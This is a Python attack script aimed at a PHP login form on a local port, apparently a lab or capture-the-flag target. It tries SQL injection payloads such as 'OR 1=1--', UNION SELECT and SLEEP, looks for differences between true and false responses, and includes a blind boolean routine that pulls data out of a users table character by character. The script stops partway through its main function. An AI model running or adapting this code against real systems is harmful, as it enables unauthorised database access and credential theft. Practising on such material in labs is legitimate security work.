#!/usr/bin/env python3

import requests
import sys
import time
import re

# Configuration
TARGET_URL = "http://127.0.0.1:33210/index.php"
PHPSESSID = "pr8716h5ra06p5lchf9osb22qr"

# Session setup with cookie
session = requests.Session()
session.cookies.set("PHPSESSID", PHPSESSID)

def send_payload(payload):
    """Send POST request with payload and return full response details."""
    data = {
        "username": payload,
        "password": "test",
        "submit": "Login"
    }
    
    try:
        response = session.post(TARGET_URL, data=data, timeout=10)
        return response
    except Exception as e:
        print(f"[!] Error during request: {e}")
        return None

def analyze_response(response, payload):
    """Analyze response to determine success/failure pattern."""
    if not response:
        return None, "No response"
    
    # Print raw response for analysis
    print(f"\n[Payload: {payload}]")
    print(f"Status: {response.status_code}")
    print(f"Response length: {len(response.text)}")
    print(f"Response body:\n{response.text[:500]}")
    
    # Check for specific patterns
    patterns = {
        'has_password': 'password' in response.text.lower(),
        'has_username': 'username' in response.text.lower(),
        'has_welcome': 'welcome' in response.text.lower(),
        'has_login': 'login' in response.text.lower(),
        'has_error': 'error' in response.text.lower() or 'invalid' in response.text.lower()
    }
    
    print(f"Patterns detected: {patterns}")
    return patterns, response.text

def test_payload_variations():
    """Test different payload structures to find working injection pattern."""
    
    payloads = {
        'basic_or': "' OR 1=1;--",
        'basic_or_space': "' OR 1=1 -- ",
        'basic_or_no_comment': "' OR 1=1",
        'basic_and': "' AND 1=1;--",
        'basic_and_false': "' AND 1=2;--",
        'union_test': "' UNION SELECT 1,2,3;--",
        'time_based': "' OR SLEEP(3);--",
        'parenthesis': "') OR 1=1;--",
        'double_dash': "' OR 1=1--",
        'hash': "' OR 1=1#",
    }
    
    results = {}
    
    print("=" * 70)
    print("Testing Different Payload Variations")
    print("=" * 70)
    
    for name, payload in payloads.items():
        print(f"\n{'='*70}")
        print(f"Testing: {name}")
        print(f"Payload: {payload}")
        print('='*70)
        
        response = send_payload(payload)
        patterns, body = analyze_response(response, payload)
        results[name] = patterns
        
        # Brief pause to avoid overwhelming the server
        time.sleep(0.5)
    
    return results

def test_sql_injection_patterns():
    """Test SQL injection patterns to find boolean condition responses."""
    
    test_cases = [
        # TRUE/FALSE conditions
        ("Always TRUE", "' OR 1=1--", "' OR 1=2--"),
        ("String comparison TRUE", "' OR 'a'='a'--", "' OR 'a'='b'--"),
        ("Version check", "' OR VERSION()>0--", "' OR VERSION()<0--"),
        ("User check", "' OR USER()=USER()--", "' OR USER()!=USER()--"),
    ]
    
    print("\n" + "=" * 70)
    print("Testing SQL Boolean Conditions")
    print("=" * 70)
    
    results = []
    
    for name, true_payload, false_payload in test_cases:
        print(f"\n--- Testing {name} ---")
        
        print("\n[TRUE Payload]")
        true_response = send_payload(true_payload)
        true_patterns, _ = analyze_response(true_response, true_payload)
        
        print("\n[FALSE Payload]")
        false_response = send_payload(false_payload)
        false_patterns, _ = analyze_response(false_response, false_payload)
        
        # Check for differences
        if true_patterns and false_patterns:
            differences = []
            for key in true_patterns:
                if true_patterns[key] != false_patterns[key]:
                    differences.append(f"{key}: {true_patterns[key]} → {false_patterns[key]}")
            
            if differences:
                print(f"\n[!] Differences detected: {', '.join(differences)}")
                results.append({
                    'name': name,
                    'true': true_patterns,
                    'false': false_patterns,
                    'differences': differences
                })

        time.sleep(0.5)
    
    return results

def extract_data_with_boolean(condition_true_payload, condition_false_payload, 
                            extract_column, table="users"):
    """Extract data using successful boolean pattern."""
    
    print(f"\n{'='*70}")
    print(f"Extracting {extract_column} from {table}")
    print("="*70)
    
    def test_length():
        """Test length of data."""
        for length in range(1, 51):
            payload = f"{condition_true_payload[:-2]} AND LENGTH({extract_column})={length}--"
            response = send_payload(payload)
            if response and 'password' in response.text.lower():
                print(f"[+] Found length: {length}")
                return length
        return 0
    
    length = test_length()
    if length == 0:
        print("[!] Could not determine length")
        return None
    
    extracted = ""
    for pos in range(1, length + 1):
        # Binary search for character
        low, high = 32, 126
        char_code = None
        
        while low <= high:
            mid = (low + high) // 2
            
            # Test if ASCII code > mid
            payload = f"{condition_true_payload[:-2]} AND ASCII(SUBSTRING({extract_column},{pos},1))>{mid}--"
            response = send_payload(payload)
            
            if response and 'password' in response.text.lower():
                low = mid + 1
            else:
                # Test if equals mid
                payload_eq = f"{condition_true_payload[:-2]} AND ASCII(SUBSTRING({extract_column},{pos},1))={mid}--"
                response_eq = send_payload(payload_eq)
                
                if response_eq and 'password' in response_eq.text.lower():
                    char_code = chr(mid)
                    break
                else:
                    high = mid - 1
        
        if char_code:
            extracted += char_code
            print(f"[+] Character {pos}/{length}: {char_code} - Current: {extracted}")
        else:
            print(f"[!] Failed to extract character at position {pos}")
            break
    
    return extracted

def main():
    print("Enhanced SQL Injection Analysis")
    print("Target: http://127.0.0.1:33210/index.php")
    print("=" * 70)
    
    # Step 1: Test payload variations
    # variations = test_payload_variations()
    
    # Step 2: Test for boolean conditions
    print("\n" + "="*70)
    print("Finding Working Boolean Pattern")
    print("="*70)
    
    # Try a simpler approach - test if we can detect any differences
    print("\nTesting baseline responses...")
    
    # Test empty/invalid user
    response_invalid = send_payload("invaliduser")
    if response_invalid:
        print(f"\n[Invalid username response]")
        patterns_invalid, _ = analyze_response(response_invalid, "invaliduser")
    
    # Test common username
    response_admin = send_payload("admin")
    if response_admin:
        print(f"\n[Admin username response]")
        patterns_admin, _ = analyze_response(response_admin, "admin")
    
    # Check for differences
    if response_invalid and response_admin:
        print(f"\n[Comparison]")
        print(f"Admin vs Invalid differences:")
        if 'username' in response_admin.text.lower() and 'username' in response_invalid.text.lower():
            print("Both responses contain 'username' - checking for other indicators...")
            
    # Try boolean extraction with different patterns
    print("\n" + "="*70)
